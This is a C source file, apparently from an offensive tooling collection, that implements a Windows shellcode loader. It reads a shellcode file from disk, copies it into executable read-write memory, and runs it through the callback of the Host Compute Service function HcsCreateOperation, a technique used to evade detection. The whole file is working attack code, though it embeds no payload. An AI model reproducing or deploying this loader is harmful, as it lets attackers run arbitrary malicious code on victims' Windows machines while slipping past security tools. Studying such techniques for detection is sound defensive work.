// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Minimum Supported Client: Windows 10, version 1809
// Usage: this.exe <shellcode file>
#pragma comment(lib, "ComputeCore.lib")

#include <stdio.h>
#include <windows.h>
#include <ComputeCore.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HCS_SYSTEM HcsComputeSystem = NULL;
	HCS_OPERATION HcsOperation = NULL;
	if (argc != 2)
	{
		printf("Usage: HcsCreateOperation.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);

	HcsOperation = HcsCreateOperation(NULL, hAlloc);
	HcsCreateComputeSystem(L"Wra7h", L"", HcsOperation, NULL, &HcsComputeSystem);

	HcsStartComputeSystem(HcsComputeSystem, HcsOperation, NULL);
	HcsShutDownComputeSystem(HcsComputeSystem, HcsOperation, NULL);
	HcsCloseComputeSystem(HcsComputeSystem);
	HcsCloseOperation(HcsOperation);
	
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}